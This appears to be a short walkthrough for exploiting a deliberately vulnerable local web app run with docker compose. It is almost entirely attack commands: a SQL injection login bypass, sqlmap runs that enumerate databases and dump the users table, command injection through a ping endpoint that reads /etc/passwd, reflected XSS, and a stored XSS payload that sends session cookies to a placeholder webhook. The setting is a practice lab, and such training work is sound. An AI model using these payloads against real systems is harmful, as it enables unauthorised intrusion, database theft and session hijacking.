### Build and Start docker compose 
```bash
    sudo docker-compose up --build -d
```

### Exploit SQL Injection in the Login Form 
```bash
    curl -v -X POST http://127.0.0.1:5000/login -d "username=admin' -- &password=password"
```

### Exploit SQLi in Login Using SQLMAP
```bash
    # Exploting Type of SQL Injecion in the user parameter
    sqlmap -u "http://127.0.0.1:5000/login" \
       --data="username=admin&password=password" \
       -p username \
       --method=POST \
       --level=5 --risk=3 \
       --dbs

    # Enumerating Tables in the database
    sqlmap -u "http://127.0.0.1:5000/login" \ 
        --data="username=admin&password=password" \
        -p username \ 
        --tables

    # Dumping the contents of the Tables
    sqlmap -u "http://127.0.0.1:5000/login" \
        --data="username=admin&password=password" \
        -p username \
        -T users \
        --dump

```

### Same Exploitation Technique to use in 
```bash
    API /search # vuln parametre /search?q=
    API /filter # vuln paramete /filter?role=
```

### Access Admin Secret API
```bash
    curl -v -X GET http://127.0.0.1:5000/admin/secret --cookie "session=Cookie_Session" 
```

### Command Injection in PING API 
```bash
    curl -v -G "http://127.0.0.1:5000/ping" --data-urlencode "host=127.0.0.1;cat /etc/passwd" --cookie "session=Cookie_Session"
```

### REFLECTED XSS
```bash
    curl http://127.0.0.1:5000/greet?name=%3Cscript%3Ealert\(%22dakchi%20diyal%20hack%20am3lm%20achban%20lik%22\)%3C/script%3E
```

### Sored XSS 
```bash
    curl -v -X POST http://127.0.0.1:5000/comments -d "content=<script>fetch("https://YOUR-WEBHOOK-URL?c=" + encodeURIComponent(document.cookie));</script>"
```